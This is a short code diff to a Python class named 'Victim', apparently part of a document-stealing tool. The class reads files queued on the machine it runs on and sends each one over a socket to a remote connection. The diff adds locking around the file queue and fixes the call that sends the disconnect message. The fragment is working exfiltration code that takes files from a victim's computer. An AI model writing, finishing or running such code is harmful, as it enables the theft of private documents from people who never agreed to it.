@@ -16,14 +16,17 @@ class Victim(DocPuller, Protocol):
     def _pull_files(self):
         while self._running or not self._pull_files_queue.empty():
             if not self._pull_files_queue.empty():
+                self._mutex.acquire()
                 file_name = self._pull_files_queue.get()
+                self._mutex.release()
                 with open(file_name, 'rb') as f:
                     file_data = f.read()
                 file_name = file_name.split('\\')[-1]
                 print('sending', file_name)
                 file_name = file_name.encode()
                 self.send_file(self.victim, file_name, file_data)
-        self._send_string(self.DISCONNECT_MSG.encode())
+        self._send_string(self.victim, self.DISCONNECT_MSG.encode())
+
     def main(self):
         try:
             self.victim.connect(self.ADDR)
